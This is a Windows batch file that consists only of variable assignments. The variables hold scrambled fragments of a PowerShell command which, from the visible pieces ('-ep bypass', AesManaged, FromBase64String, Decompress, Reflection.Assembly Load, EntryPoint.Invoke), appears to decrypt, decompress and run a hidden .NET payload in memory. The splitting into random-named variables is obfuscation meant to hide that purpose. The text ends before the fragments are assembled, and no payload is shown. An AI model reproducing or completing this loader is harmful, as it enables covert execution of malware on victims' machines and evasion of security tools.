@echo off
set "wyigBzIlPa=();$"
set "HeTQMKaLGf=stem"
set "dTbusrAHGf=ptog"
set "OwnNCQmenV=).Sp"
set "pYyKjWUvpm= [Sy"
set "SxruwoyhRO='gni"
set "ObKRytIdEO=GojB"
set "ZIXQgekFnn=$pxJ"
set "JILulfCgQI=raph"
set "DQbxNVdTHC=ptog"
set "rjlQyRMVyt=16] "
set "FSzfvobBci=oL'["
set "ZzhVVSLprX=f = "
set "iNhNMzHhil=ne);"
set "BaSmoCQfFJ=('ev"
set "TlxZZHVeSO=sj.I"
set "XIfdSsIiXD=Secu"
set "GbVBCHMBQN=af ="
set "xVzIgeKzMb=PSsj"
set "xbikFWFjod=Obje"
set "HffivhCQgY=TqTI"
set "PBKlymlSmd=);$F"
set "PYYXJFBCyv=)) {"
set "xgLeHwtZOy=k; }"
set "JtsDplWSDe=[Env"
set "XTOOuVkgua=.Mem"
set "rYwFeRYWJJ=bjec"
set "nVlwYmCQzL=)($V"
set "aXknPpmhCq=f, 0"
set "aTejjcoJTs=Kgaf"
set "prOnaNYjtj=hy.A"
set "GUQALZnBXT=wepa"
set "nBHiwkSapn=u.Su"
set "oLFUFdMPcN=:: '"
set "rzZsUwgvcS=zm83"
set "aQrkmDehIK=tem."
set "NBdVXjzkmq=.IO."
set "DjOBljZWqr=$FGo"
set "JZToKqiEnC=DPSs"
set "POYtQzLNAb=Syst"
set "gXBsbdVGSN= [Sy"
set "UcWnGgVVzB=2VUN"
set "DDUqWwXzXQ=ionM"
set "DlgArVeqsc=PSsj"
set "mrKbsudKxq=]::N"
set "lYTiNhFsHf=j.Pa"
set "KtXumYMYYU=jB);"
set "PTPuzviQEF=$FGo"
set "jOEYEJwzVb=tS46"
set "hkLcnebEHS=.Dis"
set "osCinMSiGt=)))"
set "hWpuzAQoQC=pose"
set "obRGLZFWWn=dy, "
set "QKIBnkyFUL=ss -"
set "xwqTdFfRbQ=pres"
set "onTCFunQWW=N = "
set "wjRzrmmccu=.Key"
set "UCwDcrGFXG=[-1."
set "CsgendkiNp=n ''"
set "KlevSXGEyN=flec"
set "mUzMGOPRwQ=QlE."
set "bEAexufgzd=grap"
set "JPSPOGeeuS=.Len"
set "UnwjcjINYo= '')"
set "jjAlZKUxLa=-nop"
set "nAnMAFjYqO=BC;$"
set "egYPKwoDoL=e = "
set "zAlQDSRiZa=form"
set "FXhWArSvPK=ct S"
set "VugVwwDzrL=VKga"
set "iwqiCoSTSc=ddin"
set "MNHZhPCxkE=tion"
set "eVFbasqeBB=lit("
set "qcvSYhFMMF=V = "
set "LNprvgiHmQ=stem"
set "xyWpnWPYBg=n ''"
set "sXCNkXhqiG=comm"
set "iqNnTUtjgA=se()"
set "ScDxffIPrn=ispo"
set "SHlClxsNft=.Ass"
set "KSShSVcAFu=..-1"
set "BiLCzTJpnE=yste"
set "xspJGJnixT=-4] "
set "XSWqiOGfPu=yste"
set "HMcMFswMFy=);$D"
set "rzuPRkvkCT=epaN"
set "uFunIKPgGV=('%*'"
set "OyGyjIYniE=3); "
set "udCTGLpSUQ=();$"
set "FIVjbNjxVy=oint"
set "cRBJmgTvel=mory"
set "INbXFQdOkd=QlE "
set "GtzYBvnqRl= = N"
set "syLfWYHLEY=embl"
set "xJWvEMGARC=$DPS"
set "YVRrOHXTUK=.Sec"
set "LRnLKqSgEb=New-"
set "xvIYrcewwN=mEu."
set "halaWDtNfl= = $"
set "eBkKuOmLKq=.Dis"
set "DHHkwKLGvv=, $V"
set "SJeXaHkPVP=($EN"
set "iiyMlLTsyM=tryP"
set "KNLIkQdgSi=ion."
set "vDcssYFIsO=y.Pa"
set "GGmDjTkOFY=Disp"
set "wEmyVthbIq= if "
set "OWeUbQgszp=ody."
set "uiKPhWrOzk=brea"
set "CAbwRiOkIj='')("
set "sgOOXZtiIl=.Cry"
set "LXXtGoHfZt=[Sys"
set "cXrxTlgszx=$VKg"
set "hQSmcBQerM=-1.."
set "PJnQBUIDGU=y.Ci"
set "aPWViAPokw=stem"
set "ITHcdeXxBl='oPV"
set "yCEgHqCwRX=d;$D"
set "bNOcIzDuMd=and "
set "SJPEvLpRDX=$wep"
set "mdbqYITOOZ=6] -"
set "mJnOEUJcKI=7;$D"
set "cSXZiTEzXR=pose"
set "zHHnDcRLiY=ress"
set "dBUZHJvtCR=gMod"
set "SyqAEbnafz= '')"
set "qDvpinoKZd=bypa"
set "aoReJMDgWv=lE.T"
set "DCXMDBOhhT=HO3I"
set "cPEZbQMzlr=] -j"
set "GGeRBDQliT=  $E"
set "qaArSuCNNR=.Con"
set "jrtqTZQxgk=raph"
set "yHYIaiUDcr=PSsj"
set "NIkDIdZCjv=('da"
set "wqHiRrRQTY=urit"
set "tCbbmbkzco=bstr"
set "euxqNBFYtF=Secu"
set "PShAxiyiqi=-ep "
set "LRoSXmsCSX=PKCS"
set "CqQhkzaZxv=y]::"
set "FLxiOPNANT=-Obj"
set "NyQXhnYkYj=$dCo"
set "wQPHOQHeKL=Obje"
set "mZdQHvfZaL=)($E"
set "QwJZcTzfQP=Stre"
set "afQAxhfEfT=R5jf"
set "QIZSmhdsHQ=Kgaf"
set "szfGUvIDww=ach "
set "ouXrEQaeYs=ring"
set "WJcQpfjQTd=aN.D"
set "hAVDsNayLW=kyhK"
set "PKtUOhaKfw=g = "
set "JIzrZGTJYe=Comp"
set "ZVkcdxDDUK=ateD"
set "cGhVUuodxx=Conv"
set "yuRToCqbvl=jB.T"
set "wwyJfAcxYG=m.IO"
set "HWuKfYDqLG=[IO."
set "pztTXyalAn=sion"
set "HHaqrLKBVE=onve"
set "kUjmKAeBlf=.-16"
set "vyopzVWCRD=; };"
set "jDMzFFZxRg=]::("
set "ToGqGdUfkg=BltL"
set "ThgDmDxDRx=jB ="
set "rEfYIvmZAw=HwzI"
set "jFwEPnjZdB= = $"
set "SEawAEtvKW=ct S"
set "dlkSoxbZyB=dCod"
set "qcaCxYreaC=.Cry"
set "zzYUWmJSkD=nage"
set "QPlkaiJXOw=em.I"
set "AkCVFJbFBO=New-"
set "oXrfnSZTOP=.Cop"
set "YSJWbfGPxu=esMa"
set "dYKVrnsWUX=le  "
set "hTYPNUCkWS=]::C"
set "kMhxVjUpUX=yste"
set "PoRGPAVfkZ=rofi"
set "gTNlLIEzEB=ert]"
set "hyRceDYrQN=Syst"
set "IqKSKxRrRZ=ypto"
set "JDUnoQBUwR=$VKg"
set "rSBFFMYDuW= = ["
set "HrvgzchMCG=$MhQ"
set "XhaYAZGSnO=FcNh"
set "vhfPnccJLn=HwzI"
